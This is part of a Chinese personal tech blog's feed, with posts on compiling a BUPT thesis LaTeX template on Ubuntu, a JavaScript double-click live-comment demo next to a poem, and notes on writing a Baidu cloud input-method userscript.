<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">59</span>:<span class="number">35</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; sed -i <span class="string">'s/KaiTi/KaiTi_GB2312/g'</span> xeCJK-fonts.def</span><br><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">11</span>:<span class="number">09</span>:<span class="number">50</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; ./makethesis thesis</span><br><span class="line">===========================================</span><br><span class="line">=</span><br><span class="line">= TARGET=bare_thesis</span><br><span class="line">= MAINMATTERS=ch_intro ch_concln</span><br><span class="line">= DRIVER=xetex</span><br><span class="line">= BIBTYPE=chapbib</span><br><span class="line">=</span><br><span class="line">===========================================</span><br><span class="line">Double check above configurations! Press anykey to <span class="built_in">continue</span>, CTRL+C to stop!</span><br><span class="line"></span><br><span class="line">Checking Existence of Essential Files...</span><br><span class="line">Document class installed! Generating Thesis PDF...</span><br><span class="line">Building thesis PDF...</span><br><span class="line">This is XeTeX, Version <span class="number">3.1415926</span>-<span class="number">2.5</span>-<span class="number">0.9999</span>.<span class="number">3</span> (TeX Live <span class="number">2013</span>/Debian)</span><br><span class="line"> restricted \write18 enabled.</span><br><span class="line">entering extended mode</span><br><span class="line">(./bare_thesis.tex</span><br><span class="line">LaTeX2e &lt;<span class="number">2011</span>/<span class="number">06</span>/<span class="number">27</span>&gt;</span><br><span class="line">Babel &lt;<span class="number">3.9</span>h&gt; and hyphenation patterns <span class="keyword">for</span> <span class="number">11</span> languages loaded.</span><br><span class="line">(./buptgraduatethesis.cls</span><br><span class="line"></span><br><span class="line">LaTeX Warning: You have requested document class `buptgraduatethesis<span class="string">',</span><br><span class="line">               but the document class provides `buptgraduatethesis.cls'</span>.</span><br><span class="line"></span><br><span class="line">Document Class: buptgraduatethesis.cls <span class="number">2015</span>/<span class="number">04</span>/<span class="number">23</span> v6.<span class="number">2</span> BUPT graduate thesis LaT</span><br><span class="line">eX2e class</span><br><span class="line">...</span><br><span class="line">Package natbib Warning: There were undefined citations.</span><br><span class="line"></span><br><span class="line">(./bare_thesis.aux (./ch_intro.aux) (./ch_concln.aux))</span><br><span class="line"></span><br><span class="line">LaTeX Warning: There were undefined references.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.</span><br><span class="line"></span><br><span class="line"> )</span><br><span class="line">(see the transcript file <span class="keyword">for</span> additional information)</span><br><span class="line">Output written on bare_thesis.pdf (<span class="number">23</span> pages).</span><br><span class="line">Transcript written on bare_thesis.log.</span><br><span class="line">Processing BIB files...</span><br><span class="line">Processing index files...</span><br><span class="line">This is makeindex, version <span class="number">2.15</span> [TeX Live <span class="number">2013</span>] (kpathsea + Thai support).</span><br><span class="line">Scanning style file ./bare_thesis.ist.............................done (<span class="number">29</span> attributes redefined, <span class="number">0</span> ignored).</span><br><span class="line">Scanning input file bare_thesis.acn....done (<span class="number">4</span> entries accepted, <span class="number">0</span> rejected).</span><br><span class="line">Sorting entries....done (<span class="number">10</span> comparisons).</span><br><span class="line">Generating output file bare_thesis.acr....done (<span class="number">11</span> lines written, <span class="number">0</span> warnings).</span><br><span class="line">Output written <span class="keyword">in</span> bare_thesis.acr.</span><br><span class="line">Transcript written <span class="keyword">in</span> bare_thesis.alg.</span><br><span class="line">Rebuilding to generate cross-reference...</span><br><span class="line"></span><br><span class="line">** WARNING ** Unparsed material at end of special ignored.</span><br><span class="line"></span><br><span class="line">** WARNING ** Unparsed material at end of special ignored.</span><br><span class="line">===========================================</span><br><span class="line">= Mission Done!</span><br><span class="line">= Thesis PDF is successfully generated!</span><br><span class="line">===========================================</span><br><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">11</span>:<span class="number">30</span>:<span class="number">54</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt;</span><br></pre></td></tr></table></figure>
<p>似乎成功了，检查生成的pdf文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">11</span>:<span class="number">01</span>:<span class="number">44</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; evince bare_thesis.pdf</span><br><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">32</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; ./makethesis clean</span><br><span class="line">Clearing TMP files...</span><br><span class="line">Clearing TMP files <span class="keyword">in</span> installation...</span><br><span class="line">Clearing TMP files <span class="keyword">in</span> thesis generation...</span><br><span class="line">===========================================</span><br><span class="line">= Mission Done!</span><br><span class="line">= ALL TMP files are cleared!</span><br><span class="line">===========================================</span><br></pre></td></tr></table></figure>
<p>看了看，似乎没什么问题。接下来可能有空会记录下使用。</p>
<p>Have Fun!</p>
<p>正如史上最神奇的游戏所展示的，Lost is fun。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="Using_BUPTGraduateThesis_on_Ubuntu_14-10">Using BUPTGraduateThesis on Ubuntu 14.10</h1><p><strong>警告： 这是非官方模板，一切可能的格式问题都可能导致学位论文不被接受]]>
    </summary>
    
      <category term="linux" scheme="http://reverland.org/tags/linux/"/>
    
      <category term="tex" scheme="http://reverland.org/tags/tex/"/>
    
      <category term="linux" scheme="http://reverland.org/categories/linux/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[评注功能测试]]></title>
    <link href="http://reverland.org/web/2015/11/26/click-and-comment/"/>
    <id>http://reverland.org/web/2015/11/26/click-and-comment/</id>
    <published>2015-11-26T02:40:13.000Z</published>
    <updated>2015-12-06T09:28:00.642Z</updated>
    <content type="html"><![CDATA[<p>嗨，各位，来点好玩的。移动端什么表现就不知道了</p>
<p>双击文章内容任意地方开启点评功能</p>
<p>回车确定，只允许短评呦~虽然我没有做任何限制，just for fun。</p>
<p>将鼠标移动到点评园钮上将显示评论内容。</p>
<p>评论是实时的。你在一个页面上的评论，会立即同步到所有打开该页面的浏览器中。</p>
<h2 id="这是四点零八分的北京">这是四点零八分的北京</h2><p>这是四点零八分的北京，<br>一片手的海洋翻动；<br>这是四点零八分的北京，<br>一声雄伟的汽笛长鸣。</p>
<p>北京车站高大的建筑，<br>突然一阵剧烈的抖动。<br>我双眼吃惊地望着窗外，<br>不知发生了什么事情。</p>
<p>我的心骤然一阵疼痛，一定是<br>妈妈缀扣子的针线穿透了心胸。<br>这时，我的心变成了一只风筝，<br>风筝的线绳就在妈妈手中。</p>
<p>线绳绷得太紧了，就要扯断了，<br>我不得不把头探出车厢的窗棂。<br>直到这时，直到这时候，<br>我才明白发生了什么事情。</p>
<p>——一阵阵告别的声浪，<br>就要卷走车站；<br>北京在我的脚下，<br>已经缓缓地移动。</p>
<p>我再次向北京挥动手臂，<br>想一把抓住他的衣领，<br>然后对她大声地叫喊：<br>永远记着我，妈妈啊，北京！</p>
<p>终于抓住了什么东西，<br>管他是谁的手，不能松，<br>因为这是我的北京，<br>这是我的最后的北京。</p>
<script src="https://cdn.wilddog.com/js/client/current/wilddog.js"></script>
<script type="text/javascript">
if (window.location.pathname == "/web/2015/11/26/click-and-comment/") {
  //var text = "";
  var ref = new Wilddog("https://wilddog-yurz-0583.wilddogio.com/comments");
  var articlebody = document.querySelector('[itemprop="articleBody"]');
  document.body.style.postion = "relative";

  ref.on('child_added', function(datasnapshot) {
    var key = datasnapshot.key();
    console.log("key when child_added", key);
    var comment = datasnapshot.val();
      var dot = document.createElement('a');
      dot.classList.toggle('dot');
      dot.style.left = comment.x + "px";
      dot.style.top = comment.y  + "px";
      dot.style.position = "absolute";
      dot.style.height = "20px";
      dot.style.width = "20px";
      dot.style.borderRadius = "10px";
      dot.style.background = "rgba(52, 152, 233, 0.6)";
      dot.setAttribute('title', comment.comment);
      document.body.appendChild(dot);
  })

  articlebody.addEventListener('dblclick', function(e) {
    if (e.target.tagName == "TEXTAREA") {
      e.stopPropagation();
      return;
    }

    // add a dot

    var dot = document.createElement('a');
    dot.classList.toggle("dot");
    dot.style.left = e.pageX - 5 + "px";
    dot.style.top = e.pageY - 5 + "px";
    dot.style.position = "absolute";
    dot.style.height = "20px";
    dot.style.width = "20px";
    dot.style.borderRadius = "10px";
    dot.style.background = "rgba(52, 152, 233, 0.6)";
    document.body.appendChild(dot);

    // add a comment text
    var comment = document.createElement('div');
    comment.classList.toggle("comment");

    var textarea = document.createElement('textarea');
    textarea.style.position = "absolute";
    textarea.style.left = "10px";
    textarea.style.top = "10px";
    textarea.style.height = "40px";
    textarea.style.width = "280px";
    textarea.setAttribute("placeholder", "输入评论");
  //  textarea.value = text;
    textarea.addEventListener('keydown', function(e) {
      if (e.which == 13) {
        e.preventDefault();// 为啥没阻止换行，keyup不行
        e.stopPropagation();
        if (textarea.value == "") {
          document.body.removeChild(dot);
          return;
        }
        dot.setAttribute("title", textarea.value);
        comment.removeChild(textarea);
        ref.push({
            x: parseInt(dot.style.left),
            y: parseInt(dot.style.top),
            comment: dot.getAttribute('title')
        });
        document.body.removeChild(dot);
      }
    })
    textarea.addEventListener('blur', function(e) {
      if(!textarea.value) {
        document.body.removeChild(dot);
      } else {
        //text = textarea.value;
        document.body.removeChild(dot);
      }
    })
    comment.appendChild(textarea);
    dot.appendChild(comment);
    textarea.focus();
  });
}
</script>
]]></content>
    <summary type="html">
    <![CDATA[<p>嗨，各位，来点好玩的。移动端什么表现就不知道了</p>
<p>双击文章内容任意地方开启点评功能</p>
<p>回车确定，只允许短评呦~虽然我没有做任何限制，just for fun。</p>
<p>将鼠标移动到点评园钮上将显示评论内容。</p>
<p>评论是实时的。你在一个]]>
    </summary>
    
      <category term="comment" scheme="http://reverland.org/tags/comment/"/>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="web" scheme="http://reverland.org/tags/web/"/>
    
      <category term="web" scheme="http://reverland.org/categories/web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[百度云输入法Userscript——实践和思考]]></title>
    <link href="http://reverland.org/javascript/2015/11/24/web-based-input-method/"/>
    <id>http://reverland.org/javascript/2015/11/24/web-based-input-method/</id>
    <published>2015-11-24T10:07:23.000Z</published>
    <updated>2015-11-24T16:45:01.329Z</updated>
    <content type="html"><![CDATA[<p>two days’ dirty hack，很多天之前写的一个利用<a href="https://greasyfork.org/zh-CN/scripts/13193-baiducloudinput" target="_blank" rel="external">百度云输入法的Userscript</a>，没有你们想得这么高大上两天自己开发了个输入法ORZ。。。</p>
<p>2015.10.18 23:32, 首发<a href="http://www.jianshu.com/p/5e56524c91fc" target="_blank" rel="external">简书</a>。</p>
<p>我想总结下在写这个过程中学到了些什么。</p>
<p><img src="http://img.vim-cn.com/5d/a20cb0ec4c83d7f3e6d8cbd6e2e8bf36930958.gif" alt="最终版本"></p>
<h2 id="综述">综述</h2><p>设计很简单，简单分为网络请求-用户界面-控制逻辑三部分。</p>
<h2 id="网络请求">网络请求</h2><p>原理非常简单。简单分析下百度云输入法，关键在这么一个请求</p>
<pre><code>http://olime.baidu.com/py?input=shuru&amp;inputtype=py&amp;bg=<span class="number">0</span>&amp;ed=<span class="number">20</span>&amp;<span class="literal">result</span>=hanzi&amp;resultcoding=unicode&amp;ch_en=<span class="number">0</span>&amp;clientinfo=web&amp;version=<span class="number">1</span>
</code></pre><p>其中参数也很清晰，其中参数<code>input</code>后面是输入的拼音，<code>inputtype</code>是输入法类型(<code>py</code>代表拼音)。<code>bg</code>代表begin，<code>ed</code>代表end，后面是啥管它呢。。。</p>
<p>这个请求会返回一个json，该json包含<code>shuru</code>这个拼音对应的结果，通过bg和ed能指定返回的范围。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"<span class="attribute">status</span>":<span class="value"><span class="string">"T"</span></span>,"<span class="attribute">errno</span>":<span class="value"><span class="string">"0"</span></span>,"<span class="attribute">errmsg</span>":<span class="value"><span class="string">""</span></span>,"<span class="attribute">result</span>":<span class="value">[[[<span class="string">"\u8f93\u5165"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u9f20\u5973"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"NEWWORD"</span></span>&#125;],[<span class="string">"\u672f\u5112"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"NEWWORD"</span></span>&#125;],[<span class="string">"\u6dd1\u5982"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u7ad6\u5112"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u9f20\u4e73"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u6691\u6ebd"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u83fd\u4e73"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u67a2\u5112"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u6f8d\u6fe1"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u758f\u8339"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u4e66"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u6570"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u5c5e"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u6811"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u672f"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u8f93"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u8212"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u6055"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u53d4"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;]],<span class="string">"shu'ru"</span>]</span>&#125;</span><br></pre></td></tr></table></figure>
<p>所以，最后Userscript的核心简单来说就是:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ret = GM_xmlhttpRequest(&#123;</span><br><span class="line">    method: <span class="string">"GET"</span>,</span><br><span class="line">    url: <span class="string">`http://olime.baidu.com/py?input=<span class="subst">$&#123;IME.inputString&#125;</span>&amp;inputtype=py&amp;bg=0&amp;ed=100&amp;result=hanzi&amp;resultcoding=unicode&amp;ch_en=0&amp;clientinfo=web&amp;version=1`</span>,</span><br><span class="line">    onload: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//console.log("[DEBUG connect]")</span></span><br><span class="line">      resolve(res.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.then(parseJSON).then(parseRes, printError);</span><br></pre></td></tr></table></figure>
<p><code>parseRes</code>完成对返回json文件的解析，并更新用户界面，存储信息到输入法内部状态。</p>
<h2 id="用户界面。">用户界面。</h2><p>如果说还有什么比较恶心的事情，就是用户界面。一个简单的输入法用户界面显示如下</p>
<pre><code><span class="code">--------------------
shuru               |&lt;---输入提示(已经输入的内容)
--------------------\
1. 选择1             |
2. 选择2             |
3. 选择3             | &lt;----选择列表
4. 选择4             |
5. 选择5             |
---------------------</span>
</code></pre><p>好像也简单的不行。。。</p>
<p>这个用户界面应该有些良好的特性：</p>
<ol>
<li>跟随当前输入文本框光标的位置。</li>
<li>随着按键作出相应更新和变化。</li>
</ol>
<h2 id="控制逻辑">控制逻辑</h2><p>控制逻辑简单来说就是一个有穷状态自动机，监听各种按键然后根据输入法自身状态进行下一步。</p>
<p>输入法对象有些必须的基本状态：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> IME = &#123;</span><br><span class="line">  status: <span class="string">'hidden'</span>,</span><br><span class="line">  inputString: <span class="string">''</span>,</span><br><span class="line">  TEXTS: [],</span><br><span class="line">  page: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>status</code>: 表征输入法状态，主要是界面状态。</li>
<li><code>inputString</code>：存储已输入数据——输入法缓存的未处理数据。</li>
<li><code>TEXTS</code>： 用来存储百度云输入法返回后解析得到的候选词列表。</li>
<li><code>page</code>: 存储页码，将用来决定显示<code>TEXTS</code>的哪些部分。</li>
</ul>
<p>接下来就是逻辑，我虽然不知道有穷状态自动机是什么鬼，每次面试都被虐成渣，但混乱的逻辑依然把逻辑写出来了，请观者自行优化：</p>
<ol>
<li>页面加载完成后，输入法界面初始化(插入页面)，初始化状态为未显示状态。</li>
<li>检测是否有输入，如果当前是未显示状态，变成显示状态。更新界面上输入提示，向百度发出请求。解析百度返回的json文件，存储TEXTS，更新选择列表。</li>
<li>继续监听用户输入：<ol>
<li>如果是空格或数字键1-5，在输入目标光标处插入对应文本或更改选中文本。status变为不显示，重置状态。</li>
<li>如果是翻页按键，更新page，更新选择列表。</li>
<li>如果是字符按键，则更新输入提示，并继续发送请求，解析返回的json文件，更新内部存储的TEXTS，更新选择列表。</li>
<li>如果是回车键，将输入提示在输入目标光标处插入或更改选中文本。状态改为不显示，重置状态。</li>
<li>如果是退格键，更新输入提示，并继续发送请求，解析返回的json文件，更新内部存储的TEXTS，更新选择列表。<ol>
<li>如果输入提示中没有内容更新显示状态为消失，重置状态。</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>很简单。。。就是这么简单。</p>
<h2 id="其他">其他</h2><p>接下来说一些实践者才会碰到的问题。</p>
<h3 id="按键监听">按键监听</h3><p>我们都知道，你可以在<code>textarea</code>或者<code>input</code>上监听<code>keydown</code>、<code>keyup</code>、<code>keypress</code>事件来监听各种按键。</p>
<p>只有实践者才知道这简单描述后日了狗的现状。</p>
<h3 id="按键冲突">按键冲突</h3><p>首先，你想跟系统或者其他软件按键绑定冲突么，你监听个<code>alt</code>试试…我这里可以监听到，但ubuntu unity也会被触发。。。结果就是，如果你尝试绑定<code>Alt+F</code>这种快捷键基本上会被firefox直接劫持根本不会监听到F的按下。</p>
<h3 id="用多个层次的事件监听不同按键">用多个层次的事件监听不同按键</h3><p>其次，我会告诉你<a href="http://devdocs.io/dom_events/keydown" target="_blank" rel="external"><code>keydown</code></a>是不能区分大小写的，而<a href="http://devdocs.io/dom_events/keypress" target="_blank" rel="external"><code>keypress</code></a>是可以的。但后者却不能监听非输入字符。参考以下firefox中例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$p.addEventListener(<span class="string">"keypress"</span>,e=&gt;<span class="built_in">console</span>.log(e))</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">$p.addEventListener(<span class="string">"keyup"</span>,e=&gt;<span class="built_in">console</span>.log(e))</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">$p.addEventListener(<span class="string">"keydown"</span>,e=&gt;<span class="built_in">console</span>.log(e))</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"><span class="comment">// 当我按下a时，输入A时</span></span><br><span class="line">keydown charCode=<span class="number">0</span>, keyCode=<span class="number">65</span></span><br><span class="line">keypress charCode=<span class="number">65</span>, keyCode=<span class="number">0</span></span><br><span class="line">keyup charCode=<span class="number">0</span>, keyCode=<span class="number">65</span></span><br><span class="line"><span class="comment">// 当我按下Caps Lock时</span></span><br><span class="line">keydown charCode=<span class="number">0</span>, keyCode=<span class="number">20</span></span><br><span class="line">keyup charCode=<span class="number">0</span>, keyCode=<span class="number">20</span></span><br><span class="line"><span class="comment">// 当我按下a时，输入a时</span></span><br><span class="line">keydown charCode=<span class="number">0</span>, keyCode=<span class="number">65</span></span><br><span class="line">keypress charCode=<span class="number">97</span>, keyCode=<span class="number">0</span></span><br><span class="line">keyup charCode=<span class="number">0</span>, keyCode=<span class="number">65</span></span><br></pre></td></tr></table></figure>
<p>可以看到<code>keypress</code>对象中的<code>charCode</code>属性很好的反映了真正的输入字符。而<code>keydown</code>或者<code>keyup</code>则用在监听非输入字符上。(似乎最开始也是这么设计的)</p>
<p>所以，我这里最后采用了分层的事件处理机制(扯的这么高大上实际上就是允许绑定多个事件顺序触发)来监听不同按键，分层执行逻辑。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tt.addEventListener(<span class="string">'keydown'</span>, checkNonCharacter);</span><br><span class="line">tt.addEventListener(<span class="string">'keyup'</span>, reqAndRefresh);</span><br><span class="line">tt.addEventListener(<span class="string">'keypress'</span>, intercept);</span><br></pre></td></tr></table></figure>
<p>另外，chromium和firefox的事件对象稍有差别，注意下就好。</p>
<h3 id="事件捕获">事件捕获</h3><p>当你截获按键之后，<em>必须</em> 要考虑清楚是否要阻止目标捕获该按键。比如我们用回车将输入提示内容输入到textarea光标位置后，显然不希望textarea捕获回车再来个换行。结果就是，上面简洁的逻辑过程有了很多真正使用时才发现的细节逻辑错误，接着就是靠各种判断来fix(dirty hack)。</p>
<p>参照以下退格键的例子，我们只想在输入法输入提示上回删，不希望在textarea或者input中也发生回删。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="built_in">String</span>.fromCharCode(e.which)) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="built_in">String</span>.fromCharCode(<span class="number">8</span>): <span class="comment">// 退格</span></span><br><span class="line">   e.preventDefault();</span><br><span class="line"></span><br><span class="line">   IME.inputString = IME.inputString.substr(<span class="number">0</span>, IME.inputString.length - <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span> (IME.inputString.length == <span class="number">0</span>) &#123;</span><br><span class="line">     IME.status = <span class="string">'hidden'</span>;</span><br><span class="line">     showImePop(<span class="literal">false</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="文本内容更新">文本内容更新</h3><p>怎么更新textarea或者input内的内容呢。有两种情况：</p>
<ol>
<li>在光标后插入，并把光标置于更新文字之后</li>
<li>替换选中文字，并把光标置于替换后文字之后</li>
</ol>
<p>实际上，输入框（textarea或者input）元素提供了<code>selectionStart</code>和<code>selectionEnd</code>属性来读取选择文本的开始和结束，如果没有选中文字，则两个值一样都为光标现在所在位置。所以，根据这两个值更新内容和光标位置就行。</p>
